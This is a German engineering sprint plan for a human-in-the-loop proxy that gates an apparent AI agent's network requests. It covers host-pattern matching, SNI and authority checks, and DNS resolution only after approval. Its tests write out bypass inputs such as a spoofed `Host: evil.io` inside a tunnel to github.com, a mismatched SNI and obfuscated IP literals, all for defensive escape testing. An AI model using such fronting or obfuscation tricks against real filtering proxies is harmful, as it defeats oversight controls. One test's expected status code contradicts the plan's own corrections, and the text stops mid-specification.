# Sprint 2 · First Decision (M2)

Ziel des Sprints: Der vollständige Moderationskreislauf funktioniert mit echtem Daemon und echtem UI. Regeln entscheiden automatisch, alles andere wird gehalten, der Mensch entscheidet mit Scope und Dauer, alles landet in History und lässt sich exportieren. Am Ende läuft `tests/e2e/m2_first_decision` grün unter xvfb.

Voraussetzungen aus Sprint 0 und 1: HUM-003 (Proto), HUM-004 (core-types), HUM-005 (Fake-Daemon), HUM-008 (Tokens), HUM-015 (Proxy-Kern), HUM-016 (Hold-Queue), HUM-018 (gRPC-Server), HUM-019 (Shell), HUM-020 (Intercept v1), HUM-062 (config), HUM-063 (Diagnostic), HUM-064 (CLI).

| Reihenfolge | ID | Titel | Größe | Ebene |
|---|---|---|---|---|
| 1 | HUM-022 | Regel-Engine | L | Daemon |
| 2 | HUM-023 | Host/SNI/Authority-Konsistenz | M | Daemon |
| 3 | HUM-024 | DNS erst nach Allow | M | Daemon |
| 4 | HUM-025 | Findings-Detektoren Tier 1 | M | Daemon |
| 5 | HUM-026 | Recorder | M | Daemon |
| 6 | HUM-027 | Rules-RPCs | S | Daemon/IPC |
| 7 | HUM-065 | CLI rules/flows | S | CLI |
| 8 | HUM-028 | Aktionsleiste komplett | M | UI |
| 9 | HUM-072 | Block mit Notiz | S | HUM-028 |
| HUM-029 | Queue-Gruppierung und Batch | M | UI |
| 10 | HUM-030 | Body-Ansichten | M | UI |
| 11 | HUM-031 | Domain-Panel v1 | M | Daemon + UI |
| 12 | HUM-032 | History-Screen | L | UI |
| 13 | HUM-033 | Rules-Screen | M | UI |
| 14 | HUM-034 | Notification und Tray | M | UI |
| 15 | HUM-035 | shadcn vs forui Entscheidung | S | UI |
| 16 | HUM-036 | Demo-Skript M2 | S | e2e |

---

> **Review-Korrekturen 2026-09-02** (gelten vor dem Text): HUM-024: verweigert nach Auflösung private, Loopback-, Link-Local-, CGNAT-Adressen, außer die matchende Regel hat `allow_private: true` (LLM-Passthrough setzt es; `localhost` funktioniert damit); DNS-/Connect-/TLS-Fehler führen in `FlowState::Failed{UpstreamError}` (CONVENTIONS 3.2), nie in `Responded{502}`; der Client bekommt `502` mit `Blocked by Humanitl.`-Body und `reason: upstream_dns` usw. HUM-023: Body-Cap antwortet `413`, Hold-Timeout `504`, Speicherbudget `503`, Policy `403`.
>
> **Abgleich 2026-09-02**: `Rule`, `Matcher`, `Action`, `Expiry`, `HostPattern` liegen in `humanitl-core::rule` (HUM-063), `humanitl-rules` enthält YAML-Parser und `RuleSet::evaluate`; `catalog` darf `HostPattern` aus core nutzen. `match.upgrade: websocket` ist Teil des YAML-Schemas. Session-Regeln werden vor persistenten Regeln ausgewertet (ADR-007). Blob-Pfade sind sharded `blobs/<hex[0..2]>/<hex>`. Upstream-Verbindungen nur über `Egress` (HUM-015). Neue Config-Schlüssel dieses Sprints (`resolver.*`, `findings.*`, `recorder.max_body_bytes`, `upstream.connect_timeout_secs`) sind in CONVENTIONS 4.4 registriert. Exit-Codes 10/11 für `rules test` gelten.

## HUM-022 · Regel-Engine
Sprint: 2 · Größe: L · Abhängigkeiten: HUM-004, HUM-063 · Blockiert: HUM-023, HUM-027, HUM-028, HUM-033, HUM-036

### Kontext
Setzt ADR-007 um. Ohne Regeln wird jede Anfrage gehalten (Default `ask`). Regeln sind der einzige Mechanismus, mit dem Lärm reduziert wird, und gleichzeitig die Stelle, an der Sicherheitsfehler am leichtesten passieren (Substring-Match, Homographen, IP-Literale). Die Crate `humanitl-rules` ist rein (kein IO, kein async) und wird tabellengetrieben getestet.

### Ziel
Die Crate `humanitl-rules` kann `rules.yaml` parsen, Regeln normalisieren, eine `RequestKey` gegen ein `RuleSet` auswerten und ein `Verdict` liefern. Alle Fälle aus der Matching-Tabelle unten sind als Tests vorhanden und grün. Parse-Fehler kommen als `Diagnostic` mit Zeilennummer. Escape-Test 4 (BACKLOG.md 4.5) ist vollständig grün.

### Nicht-Ziel
Persistenz der Regeln (HUM-027), Auswertung im Proxy-Pfad (HUM-023 ruft `evaluate` auf), Regel-UI (HUM-033), `redact`-Ausführung (HUM-047; hier wird nur `Action::Redact` als Verdict zurückgegeben).

### Betroffene Pfade
- `daemon/crates/rules/Cargo.toml` (neu)
- `daemon/crates/rules/src/lib.rs` (neu)
- `daemon/crates/rules/src/host.rs` (neu, `HostPattern`, Label-Matching)
- `daemon/crates/rules/src/path.rs` (neu, Pfad-Glob und Regex)
- `daemon/crates/rules/src/parse.rs` (neu, YAML → `RuleSet`, Diagnostics)
- `daemon/crates/rules/src/eval.rs` (neu, `evaluate`)
- `daemon/crates/rules/tests/host_table.rs` (neu, Matching-Tabelle)
- `daemon/crates/rules/tests/parse.rs` (neu)
- `daemon/crates/rules/tests/eval.rs` (neu)
- `daemon/crates/core-types/src/host.rs` (ändern: `HostName::parse` falls in HUM-004 noch nicht vorhanden)
- `rules/default.yaml` (neu, vorerst leer mit `version: 1`, gefüllt in HUM-038)

### Spezifikation

**Host-Normalisierung** (`humanitl-core`, wird von Proxy und Regeln gemeinsam genutzt):

```rust
impl HostName {
    /// Parst einen Host aus Authority/Host-Header. Reihenfolge:
    /// 1. Eckige Klammern entfernen, `std::net::IpAddr::from_str` versuchen → `HostName::Ip`.
    ///    Nicht-kanonische Formen (`0x8c527003`, `0177.0.0.1`, `2130706433`) werden von std abgelehnt und
    ///    fallen in Schritt 2, wo sie an den IDNA-Regeln scheitern → Err.
    /// 2. Trailing dot entfernen, `idna::domain_to_ascii_strict` (UTS-46, transitional=false),
    ///    ASCII-lowercase. Leere Labels, Labels > 63 Bytes, Gesamtlänge > 253 → Err.
    /// 3. Ergebnis `HostName::Dns(String)`.
    pub fn parse(raw: &str) -> Result<HostName, HostParseError>;
    /// Labels von links nach rechts, z. B. ["api", "github", "com"].
    pub fn labels(&self) -> Option<Vec<&str>>;   // None für Ip
    /// U-Label-Darstellung für die UI (`münchen.de`), Punycode bleibt daneben sichtbar.
    pub fn display(&self) -> String;
}
pub enum HostParseError { Empty, TooLong, InvalidLabel(String), Idna(String) }
```

**Host-Muster** (`humanitl-rules::host`):

```rust
pub enum HostPattern {
    Glob(Vec<LabelPat>),        // von links nach rechts
    Ip(IpAddr),                 // "ip:140.82.112.3"
    Cidr(IpNet),                // "cidr:192.168.0.0/16"   (Crate `ipnet`)
}
pub enum LabelPat { Literal(String), One, Many }   // "foo", "*", "**"

impl HostPattern {
    /// Parst ein Muster aus rules.yaml. Fehler → RULES_003.
    /// Regeln: Sterne nur als ganzes Label ("*foo.com" ist ungültig). Literal-Labels werden
    /// wie Hosts normalisiert (IDNA, lowercase). Enthält ein Literal "xn--", wird zusätzlich
    /// Diagnostic RULES_004 (Warning) ausgegeben.
    pub fn parse(s: &str) -> Result<(HostPattern, Vec<Diagnostic>), Diagnostic>;
    pub fn matches(&self, host: &HostName) -> bool;
}
```

Label-Matching-Algorithmus (`matches` für `Glob`):

1. `host` ist `Ip` → `false`. (IP-Literale matchen nie ein Glob.)
2. `pat` und `labels` sind Slices. Rekursiv `m(pat, labels)`:
   - beide leer → `true`
   - `pat` leer, `labels` nicht → `false`
   - `pat[0] == Literal(l)` → `labels` nicht leer und `labels[0] == l` und `m(pat[1..], labels[1..])`
   - `pat[0] == One` → `labels` nicht leer und `m(pat[1..], labels[1..])`
   - `pat[0] == Many` → für `k` in `1..=labels.len()`: `m(pat[1..], labels[k..])`; irgendeins `true` → `true`
3. Apex-Ausnahme: beginnt `pat` mit `Many` und hat mehr als ein Element, dann zusätzlich `m(pat[1..], labels)` (das erlaubt `**.example.com` für `example.com`).
4. Ein Muster, das nur aus `[Many]` besteht, matcht jeden DNS-Host, keinen IP-Host.

`Ip(a)` matcht `HostName::Ip(b)` genau bei `a == b` (IPv4-mapped IPv6 `::ffff:1.2.3.4` wird vor dem Vergleich auf IPv4 kanonisiert). `Cidr(n)` matcht bei `n.contains(b)`. Beide matchen nie `HostName::Dns`.

**Matching-Tabelle Host** (jede Zeile ist ein Testfall in `tests/host_table.rs`, Name `host_<nr>`):

| Nr | Muster | Host (roh) | Erwartet | Grund |
|---|---|---|---|---|
| 1 | `*.github.com` | `api.github.com` | ✓ | ein Label |
| 2 | `*.github.com` | `github.com` | ✗ | `*` braucht genau ein Label |
| 3 | `*.github.com` | `a.b.github.com` | ✗ | zwei Labels |
| 4 | `*.github.com` | `evil-github.com` | ✗ | Label-Vergleich, kein Substring |
| 5 | `*.github.com` | `github.com.evil.io` | ✗ | Suffix stimmt nicht |
| 6 | `*.github.com` | `API.GITHUB.COM.` | ✓ | lowercase + trailing dot |
| 7 | `*.github.com` | `api.github.com.` | ✓ | trailing dot |
| 8 | `**.github.com` | `github.com` | ✓ | Apex-Ausnahme |
| 9 | `**.github.com` | `api.github.com` | ✓ | |
| 10 | `**.github.com` | `a.b.c.github.com` | ✓ | mehrere Labels |
| 11 | `**.github.com` | `github.com.evil.io` | ✗ | |
| 12 | `**.github.com` | `notgithub.com` | ✗ | |
| 13 | `github.com` | `github.com` | ✓ | exakt |
| 14 | `github.com` | `www.github.com` | ✗ | exakt heißt exakt |
| 15 | `github.com` | `GitHub.Com` | ✓ | case |
| 16 | `*.*.example.com` | `a.b.example.com` | ✓ | |
| 17 | `*.*.example.com` | `a.example.com` | ✗ | |
| 18 | `api.*.com` | `api.github.com` | ✓ | Stern in der Mitte |
| 19 | `api.*.com` | `api.co.uk` | ✗ | letztes Label |
| 20 | `**` | `anything.example` | ✓ | alle DNS-Hosts |
| 21 | `**` | `140.82.112.3` | ✗ | IP nie per Glob |
| 22 | `*` | `localhost` | ✓ | ein Label |
| 23 | `*` | `a.b` | ✗ | |
| 24 | `münchen.de` | `xn--mnchen-3ya.de` | ✓ | Muster wird zu A-Label |
| 25 | `xn--mnchen-3ya.de` | `münchen.de` | ✓ | Host wird zu A-Label; Parse liefert RULES_004 |
| 26 | `*.github.com` | `140.82.112.3` | ✗ | IP |
| 27 | `ip:140.82.112.3` | `140.82.112.3` | ✓ | |
| 28 | `ip:140.82.112.3` | `140.82.112.4` | ✗ | |
| 29 | `ip:140.82.112.3` | `[::ffff:140.82.112.3]` | ✓ | mapped IPv6 kanonisiert |
| 30 | `cidr:192.168.0.0/16` | `192.168.1.50` | ✓ | |
| 31 | `cidr:192.168.0.0/16` | `10.0.0.1` | ✗ | |
| 32 | `cidr:192.168.0.0/16` | `192.168.1.50.nip.io` | ✗ | DNS-Host, nicht IP |
| 33 | `ip:::1` | `[::1]` | ✓ | |
| 34 | `ip:127.0.0.1` | `localhost` | ✗ | keine Auflösung |
| 35 | `**.github.com` | `0x8c527003` | Err | `HostName::parse` schlägt fehl → Verdict Default |
| 36 | `**.github.com` | `0177.0.0.1` | Err | wie 35 |
| 37 | `*.github.com` | `api.github.com` mit `upgrade=websocket`, Regel ohne `upgrade` | ✗ (Verdict Default) | siehe Upgrade-Regel |
| 38 | `*.github.com` + `upgrade: websocket` | `api.github.com` ohne Upgrade | ✗ (Verdict Default) | Upgrade-Regeln matchen nur Upgrades |
| 39 | `*foo.com` | — | Parse-Err RULES_003 | Stern nur als ganzes Label |
| 40 | `foo..com` | — | Parse-Err RULES_003 | leeres Label |
| 41 | `` (leer) | — | Parse-Err RULES_003 | |
| 42 | `*.github.com` | `api.github.com:8443` | Host ✓, Port über `port`-Schlüssel | Port ist separater Schlüssel |

**Pfad-Muster** (`path.rs`): Beginnt der String mit `~`, ist der Rest ein Regex (Crate `regex`, `RegexBuilder::size_limit(1 << 20)`, `dfa_size_limit(1 << 20)`); Fehler → RULES_005. Sonst Glob über `globset::GlobBuilder::new(s).literal_separator(true).build()`; damit kreuzt `*` keinen `/`, `**` schon. Verglichen wird nur der Pfad ohne Query (`path_and_query` bis zum ersten `?`). Fehlt `path`, matcht jeder Pfad.

**Regel-Datei** (`rules.yaml`, erweitert das Schema aus CONVENTIONS 3.3 um `upgrade`):

```yaml
version: 1
rules:
  - id: 018f6c1e-7a2b-7c3d-8e4f-0123456789ab   # optional beim Anlegen; wird generiert
    action: allow            # allow | block | ask | redact
    match:
      host: "**.npmjs.org"
      method: [GET, HEAD]    # optional; Werte aus GET HEAD POST PUT PATCH DELETE OPTIONS CONNECT TRACE
      path: "/**"            # optional
      scheme: https          # optional: http | https
      port: 443              # optional: 1..65535
      upgrade: websocket     # optional; einziger Wert im MVP
    expires: session         # never | session | ISO-8601-Zeitstempel (UTC)
    stream: false
    created_from: 018f...    # optional FlowId
    bundled: false
    note: "npm install"
```

Parse-Diagnostics (Code, Severity, `why`-Text auf Englisch als ARB-Schlüssel `rules_diag_<code>`):

| Code | Severity | Wann | `fix` |
|---|---|---|---|
| RULES_001 | Error | Datei nicht lesbar | `CopyCommand("chmod u+r …")` |
| RULES_002 | Error | YAML-Syntax oder Schema ungültig; `why` enthält `line:col` und Feldpfad | keine |
| RULES_003 | Error | Host-Muster ungültig | keine |
| RULES_004 | Warning | Punycode-Literal im Muster | keine |
| RULES_005 | Error | Regex ungültig oder zu groß | keine |
| RULES_006 | Error | `version` fehlt oder ≠ 1 | keine |
| RULES_007 | Error | doppelte `id` | keine |
| RULES_008 | Warning | Regel matcht nichts Sinnvolles (z. B. `host: "**"` mit `action: allow`) | keine |

Bei Fehlern der Severity `Error` wird die Datei als Ganzes abgelehnt (`Err(Vec<Diagnostic>)`), der Daemon läuft mit dem zuletzt gültigen `RuleSet` weiter und meldet den Fehler über `diagnosticsProvider`. Warnings werden mitgeliefert (`Ok((RuleSet, Vec<Diagnostic>))`).

**Öffentliche API:**

```rust
pub fn parse_rules(yaml: &str) -> Result<(RuleSet, Vec<Diagnostic>), Vec<Diagnostic>>;
pub fn serialize_rules(set: &RuleSet) -> String;    // stabile Feldreihenfolge wie oben, ids immer gesetzt

pub struct RuleSet { rules: Vec<Rule> }
impl RuleSet {
    pub fn evaluate(&self, key: &RequestKey, now: DateTime<Utc>, session: SessionId) -> Verdict;
    pub fn insert(&mut self, pos: Option<usize>, rule: Rule) -> RuleId;   // None = ans Ende
    pub fn remove(&mut self, id: RuleId) -> Option<Rule>;
    pub fn update(&mut self, rule: Rule) -> Result<(), UnknownRule>;
    pub fn reorder(&mut self, id: RuleId, new_pos: usize) -> Result<(), UnknownRule>;
    pub fn prune(&mut self, now: DateTime<Utc>, session: SessionId) -> Vec<RuleId>;  // entfernt abgelaufene
    pub fn iter(&self) -> impl Iterator<Item = &Rule>;
    pub fn get(&self, id: RuleId) -> Option<&Rule>;
}
```

**`evaluate`-Algorithmus** (exakt so implementieren):

1. Ist `key.method` nicht in der bekannten Menge (GET HEAD POST PUT PATCH DELETE OPTIONS CONNECT TRACE) → `Verdict::Default`.
2. Für jede Regel `r` in Reihenfolge:
   a. `r.expires` prüfen: `Session(s)` mit `s != session` → weiter; `At(t)` mit `t <= now` → weiter.
   b. Upgrade-Dimension: `key.upgrade.is_some() != r.matcher.upgrade.is_some()` → weiter.
   c. `r.matcher.host.matches(key.host)` falsch → weiter.
   d. `r.matcher.methods` gesetzt und `key.method` nicht enthalten → weiter.
   e. `r.matcher.scheme` gesetzt und ungleich → weiter.
   f. `r.matcher.port` gesetzt und ungleich → weiter.
   g. `r.matcher.path` gesetzt und matcht nicht → weiter.
   h. Treffer → `return Verdict::Matched { rule: r.id, action: r.action }`.
3. Keine Regel → `Verdict::Default`.

`Verdict::Default` bedeutet `Ask`. Der Aufrufer (HUM-023) behandelt `Action::Redact` im MVP als `Ask` nach Detektor-Lauf.

### Schritte
1. `HostName::parse`, `labels`, `display` in `humanitl-core` implementieren; Unit-Tests für Fälle 6, 7, 15, 24, 25, 29, 35, 36.
2. `HostPattern::parse` und `matches` in `host.rs`; `tests/host_table.rs` mit allen 42 Zeilen als `#[test] fn host_NN()`.
3. `path.rs` mit Glob und Regex; Tests für `/repos/**` vs `/repos/a/b`, `/repos/*` vs `/repos/a/b` (✗), `~^/v[0-9]+/` vs `/v2/x` (✓), ungültiges Regex → RULES_005.
4. `parse.rs`: serde-Structs für YAML, Konvertierung in `Rule` mit Diagnostics; Tests für jede Diagnostic-Code-Zeile.
5. `eval.rs` mit dem Algorithmus; Tests für Reihenfolge (erste passende Regel gewinnt), Expiry (Session anderer Session, abgelaufenes `At`), Upgrade-Dimension, unbekannte Methode.
6. `serialize_rules` und Roundtrip-Test (`parse(serialize(parse(x))) == parse(x)`).
7. `prune` und Test.
8. `tests/escape/esc-4.sh` erweitern, sodass er `humanitl rules test URL` (HUM-065) gegen eine Testdatei aufruft; Escape-Test 4 grün.

### Tests
- `host_table.rs`: 42 Fälle aus der Tabelle.
- `parse.rs`: pro Diagnostic-Code ein Fall; Roundtrip.
- `eval.rs`:
  - `first_match_wins`: Regeln `[block **.github.com, allow api.github.com]`, Key `api.github.com` → Block.
  - `session_scoped`: Regel `expires: session(A)`, evaluate mit Session B → Default.
  - `expired_at`: `At(now - 1s)` → Default.
  - `upgrade_dimension`: Fälle 37 und 38.
  - `unknown_method`: `BREW` → Default trotz `**` allow.
  - `path_without_query`: Regel `path: "/search"`, Key `/search?q=x` → Matched.
  - `redact_returned`: Regel `redact` → `Matched{action: Redact}`.
- Property-Test (`proptest`): zufällige Hosts aus Labels `[a-z0-9-]{1,10}`, Muster `*.X` matcht genau dann, wenn Host genau ein Label vor `X` hat.

### Akzeptanzkriterien
- [ ] `cargo test -p humanitl-rules` grün, 42 Host-Fälle plus alle Parse- und Eval-Tests vorhanden.
- [ ] `cargo clippy -p humanitl-rules -- -D warnings` sauber; Crate hat keine Abhängigkeit auf tokio, std::fs oder std::net außer `IpAddr`.
- [ ] `parse_rules` liefert für eine Datei mit `host: "*foo.com"` genau ein `Diagnostic` mit `code == RULES_003` und `why` enthält den Muster-String.
- [ ] Escape-Test 4 (`tests/escape/esc-4.sh`) grün in CI.
- [ ] Doku-Kommentar auf jedem öffentlichen Item, `cargo doc --no-deps` ohne Warnungen.

### Fallstricke
- Niemals `host.ends_with(pattern)` oder `contains`. Immer Labels vergleichen. Fall 4 und 5 sind die Tests dafür.
- `regex`-Crate verwenden, nicht `fancy_regex` (Backtracking). `size_limit` setzen, sonst kann eine Nutzer-Regex Speicher fressen.
- `idna::domain_to_ascii` (nicht-strict) akzeptiert Dinge, die kein gültiger Hostname sind. `_strict` verwenden.
- `HostName::parse` für Muster-Literale wiederverwenden, sonst driften Normalisierungen auseinander.
- `expires: session` in der Datei ohne Session-ID bedeutet: beim Laden wird die aktuelle Session eingesetzt; beim Serialisieren wird `session` ohne ID geschrieben. Persistierte Session-Regeln sind im nächsten Start tot, das ist beabsichtigt (HUM-027 schreibt Session-Regeln gar nicht erst in die Datei).
- `globset` mit `literal_separator(false)` (Default) lässt `*` über `/` laufen. Explizit `true` setzen.
- Methodenliste in YAML case-insensitiv einlesen, intern uppercase.

### Referenzen
BACKLOG.md ADR-007, 4.5 Test 4; CONVENTIONS.md 3.2, 3.3; Burp Target Scope (https://portswigger.net/burp/documentation/desktop/tools/target/scope); Codex `**.` Semantik (https://learn.chatgpt.com/docs/permissions); UTS-46 (https://unicode.org/reports/tr46/); Crates `idna`, `globset`, `regex`, `ipnet`.

---

## HUM-023 · Host/SNI/Authority-Konsistenz
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-015, HUM-016, HUM-022 · Blockiert: HUM-024, HUM-036

### Kontext
Setzt ADR-007 (Domain-Fronting-Absatz) um. Ein Client kann `CONNECT github.com:443` senden und innerhalb der TLS-Verbindung `Host: evil.io` setzen oder eine andere SNI schicken. Wird die Regel nur auf das CONNECT-Ziel angewendet, ist der Allow für `github.com` ein Allow für alles. Dieses Issue verdrahtet außerdem `RuleSet::evaluate` in den Proxy-Pfad und definiert, wann ein Flow gehalten wird.

### Ziel
Jeder entschlüsselte Request wird auf Konsistenz von CONNECT-Ziel, SNI und `:authority`/`Host` geprüft. Bei Abweichung wird er ohne Nachfrage geblockt (`BlockReason::AuthorityMismatch`). Der Proxy-Pfad ruft danach die Regel-Engine auf und hält nur, was `Ask` ergibt. Der Proxy koalesziert nie Upstream-Verbindungen über verschiedene Authorities.

### Nicht-Ziel
DNS-Auflösung (HUM-024), TLS-Passthrough ohne MITM (nicht im MVP, alles wird terminiert), HTTP/2 zum Upstream (bleibt `experimental.h2_upstream = false`).

### Betroffene Pfade
- `daemon/crates/proxy/src/connect.rs` (neu: CONNECT-Handling, `ConnectionContext`)
- `daemon/crates/proxy/src/tls.rs` (ändern: SNI-Capture)
- `daemon/crates/proxy/src/pipeline.rs` (ändern: Reihenfolge Authority-Check → Findings → Rules → Hold)
- `daemon/crates/proxy/src/error.rs` (ändern: Diagnostics PROXY_003)
- `daemon/crates/proxy/tests/authority.rs` (neu)

### Spezifikation

```rust
/// Pro Client-Verbindung, lebt vom CONNECT bis zum Verbindungsende.
pub struct ConnectionContext {
    pub connect_target: Option<Authority>,   // None bei Plain-HTTP ohne CONNECT
    pub sni: Option<HostName>,               // aus ClientHello, gesetzt vom Resolver unten
    pub client_addr: SocketAddr,
}
```

SNI-Capture: hudsucker baut die Server-`rustls::ServerConfig` über `CertificateAuthority::gen_server_config(&Authority)`. Wir umhüllen den von hudsucker erzeugten `ResolvesServerCert` mit einem eigenen `SniRecordingResolver`, dessen `resolve(&self, hello: ClientHello) -> Option<Arc<CertifiedKey>>` zuerst `hello.server_name()` in `ConnectionContext.sni` schreibt (via `Arc<Mutex<Option<HostName>>>` in der Kontext-Struktur) und dann an den inneren Resolver delegiert. Ist das mit hudsucker 0.25 nicht ohne Fork möglich, gilt: Vergleich `:authority` gegen CONNECT-Ziel ist Pflicht, SNI-Vergleich best-effort, und es wird ein Issue mit Diagnostic-Code PROXY_090 (Info, „SNI check unavailable") angelegt. Der Test `sni_mismatch_blocked` bleibt dann `#[ignore]` mit Begründung.

Vergleichsregeln (Funktion `check_authority(ctx: &ConnectionContext, req: &HttpRequest) -> Result<Authority, BlockReason>`):

1. `A` = Authority des Requests: bei HTTP/2 `:authority`; bei HTTP/1.1 `Host`-Header; bei absoluter Request-URI (Proxy-Form `GET http://h/p`) muss deren Host gleich dem `Host`-Header sein, sonst `AuthorityMismatch`. Fehlt `Host` bei HTTP/1.1 → `AuthorityMismatch`.
2. Port-Default für `A`: fehlt der Port, ist er 443 wenn `ctx.connect_target.is_some()` (TLS-Tunnel), sonst 80.
3. Ist `ctx.connect_target = Some(C)`:
   - `A.host == C.host` (nach `HostName::parse` beider Seiten) und `A.port == C.port`, sonst `AuthorityMismatch`.
   - Ist `ctx.sni = Some(S)`: `S == C.host`, sonst `AuthorityMismatch`. Ist `ctx.sni = None` und `C.host` ist `Dns` → `AuthorityMismatch` (Clients ohne SNI sind im Ziel-Umfeld nicht legitim). Ist `C.host` eine IP, darf SNI fehlen.
4. Plain HTTP ohne CONNECT: `A` ist maßgeblich, `scheme = http`.
5. Ergebnis `A` wird zur `HttpRequest.authority`; der Rest des Pfads verwendet ausschließlich diese.

Pipeline-Reihenfolge in `pipeline.rs` (pro Request):

1. `FlowEvent::Received` emittieren (mit `DomainInfo`, siehe HUM-031).
2. `check_authority`; bei `Err(reason)` → `Decided(Block{reason})` → 403-Antwort (Format CONVENTIONS 3.5) → `Recorded`. Ein Sonderfall bleibt 400 statt 403: Origin-Form ohne Tunnel und ohne `Host`. Dort ist kein Ziel bekannt, ein Flow bräuchte eine erfundene Authority, und der 403-Body müsste `host: unknown` behaupten; RFC 9110 §7.2 verlangt hier ohnehin 400. Weitergeleitet wird auch dann nichts. Ebenfalls 403: ein Schema, das nicht zur Verbindung passt, also `http://` im Tunnel und `https://` ohne Tunnel. Zusätzlich Diagnostic PROXY_003 (Warning, `why` = „Client sent Host `evil.io` inside a tunnel to `github.com`") am Flow.
3. Body vollständig lesen bis `hold.body_cap_bytes`; darüber → `Decided(Block{BodyCap})` mit **413** (das Register in CONVENTIONS 3.2 und der Test aus HUM-015 gehen hier vor; die 403 aus dem Fließtext dieses Issues ist überholt), außer eine Regel mit `stream: true` matcht (dann Header-only-Hold; im MVP ausschließlich für den LLM-Passthrough relevant, HUM-039).
4. Findings-Scan (HUM-025) → `FlowEvent::Analyzed`.
5. `RuleSet::evaluate(RequestKey{...}, now, session)`:
   - `Matched{Allow}` → `Decided(Allow)` mit `rule_id`, weiter zu Forward (HUM-024).
   - `Matched{Block}` → `Decided(Block{Rule(id)})` → 403.
   - `Matched{Redact}` → wie `Default` (MVP), `rule_id` im Flow vermerkt.
   - `Matched{Ask}` oder `Default` → `FlowEvent::Held{deadline}` → `HoldQueue::hold` → Decision.
6. Bei `Decision::Allow`/`AllowEdited` → HUM-024 Forward.

Upstream-Verbindungen: der hyper-Client-Pool wird pro `(scheme, host, port)` geschlüsselt; für `AllowEdited` mit geänderter Authority wird der Request abgelehnt (UI verhindert das, Daemon prüft trotzdem: Diagnostic PROXY_005 Error, Flow bleibt Held).

### Schritte
1. `ConnectionContext` anlegen und im CONNECT-Handler von hudsucker (`HttpHandler::handle_request` bei `Method::CONNECT`) befüllen; hudsucker gibt CONNECT-Requests vor dem Tunnel an den Handler.
2. `SniRecordingResolver` implementieren; Integrationstest, der mit `rustls` ClientConfig eine Verbindung mit abweichender SNI aufbaut.
3. `check_authority` mit Unit-Tests für alle Zweige.
4. Pipeline umbauen auf die Reihenfolge oben; bestehende Tests aus HUM-017 müssen weiter grün sein.
5. Regel-Engine anbinden: `RuleSet` als `Arc<RwLock<RuleSet>>` im Proxy-State; Session-ID aus dem Sandbox-Kontext.
6. 403-Antwortformat implementieren und Test.

### Tests
- `authority_ok`: CONNECT `github.com:443`, SNI `github.com`, `Host: github.com` → Held.
- `host_mismatch_blocked`: CONNECT `github.com:443`, `Host: evil.io` → 403, `block_reason = authority_mismatch`, kein `Held`-Event, Recorder hat Flow mit `decision = block`.
- `sni_mismatch_blocked`: CONNECT `github.com:443`, SNI `evil.io` → 403.
- `port_mismatch_blocked`: CONNECT `github.com:8443`, `Host: github.com` (Default 443) → 403.
- `ip_connect_without_sni_ok`: CONNECT `192.168.1.50:11434` ohne SNI → nicht `AuthorityMismatch`.
- `missing_host_h1_blocked`.
- `rule_allow_skips_hold`: Regel `allow api.github.com`; Request → kein `Held`, direkt `Decided(Allow)` mit `rule_id`.
- `rule_block_403`.
- `default_ask_holds`.
- `body_cap_blocks`: 33 MiB Body → `Block{BodyCap}`, Client bekommt 403 (nicht 413), Body wurde nicht an Upstream gesendet.

### Akzeptanzkriterien
- [ ] Alle Tests oben grün; `sni_mismatch_blocked` entweder grün oder `#[ignore]` mit Verweis auf PROXY_090-Issue.
- [ ] Escape-Test 3, Fall `curl -H 'Host: evil.io' https://github.com/` liefert 403 mit `reason: authority_mismatch`.
- [ ] `grep -r "connect_target" daemon/crates/proxy/src` zeigt, dass Regeln nur auf `HttpRequest.authority` ausgewertet werden, nie auf das CONNECT-Ziel allein.

### Fallstricke
- hudsucker öffnet die Upstream-Verbindung standardmäßig selbst beim CONNECT (Tunnel), bevor ein Request gesehen wird. Das Handling muss so konfiguriert sein, dass CONNECT nur den lokalen TLS-Endpunkt aufbaut und keine Upstream-Verbindung vor der Entscheidung entsteht (sonst leakt bereits der TCP-Connect Metadaten, und HUM-024 wird verletzt).
- `Host`-Header kann mehrfach vorkommen: mehr als einer → `AuthorityMismatch`.
- HTTP/2-Clients senden `:authority`, manchmal zusätzlich `Host`; beide müssen gleich sein.
- Der 403-Body ist für den Agenten lesbar gedacht. Keine internen Pfade oder IDs außer `FlowId` hineinschreiben.

### Referenzen
BACKLOG.md ADR-005, ADR-007, 4.5 Test 3; CONVENTIONS.md 3.5; RFC 9110 §7.2 (Host), RFC 9113 §8.3.1 (`:authority`); hudsucker Docs (https://docs.rs/hudsucker); rustls `ResolvesServerCert` (https://docs.rs/rustls/latest/rustls/server/trait.ResolvesServerCert.html).

---

## HUM-024 · DNS erst nach Allow
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-023 · Blockiert: HUM-036, HUM-039

### Kontext
Setzt ADR-006 um. Jede Namensauflösung vor der Entscheidung ist ein Leak von bis zu 63 Bytes pro Label an den DNS-Resolver und dessen Upstream. Zusätzlich muss die aufgelöste IP für die Verbindung gepinnt werden, sonst kann DNS-Rebinding eine erlaubte Domain auf eine interne IP umbiegen.

### Ziel
Der Daemon löst Hostnamen ausschließlich in `forward()` nach `Decision::Allow`/`AllowEdited` auf, über einen austauschbaren `Resolver`. Der hyper-Client bekommt die IP über einen eigenen Connector und löst nie selbst auf. Ein Test beweist mit einem Mock-Resolver, dass geblockte und getimeoutete Flows keine Auflösung auslösen. Escape-Test 3 beweist dasselbe auf Systemebene mit einem aufzeichnenden UDP-Listener.

### Nicht-Ziel
DNS-Cache-Strategien über 60 s hinaus, DoH/DoT, IPv6-Präferenzlogik (Happy Eyeballs). Redirect-Folgen (macht der Client, jeder Redirect ist ein neuer Flow).

### Betroffene Pfade
- `daemon/crates/proxy/src/resolver.rs` (neu: `Resolver`-Trait, `SystemResolver`, `MockResolver`, `OverrideResolver`)
- `daemon/crates/proxy/src/connector.rs` (neu: `PinnedConnector`)
- `daemon/crates/proxy/src/forward.rs` (neu: `forward()`)
- `daemon/crates/config/src/lib.rs` (ändern: `resolver.*`-Schlüssel)
- `daemon/crates/proxy/tests/dns_after_allow.rs` (neu)
- `tests/escape/esc-3.sh`, `tests/escape/dns-recorder.rs` (ändern/neu)

### Spezifikation

```rust
#[async_trait]
pub trait Resolver: Send + Sync {
    /// Löst genau einen Hostnamen auf. Wird NUR aus `forward()` aufgerufen.
    async fn resolve(&self, host: &str) -> Result<Vec<IpAddr>, ResolveError>;
}
pub struct SystemResolver { inner: hickory_resolver::TokioAsyncResolver, cache_ttl: Duration }  // Default: System-Config, TTL min(record, 60s)
pub struct OverrideResolver { map: HashMap<String, IpAddr>, fallback: Arc<dyn Resolver> }        // aus `resolver.overrides`
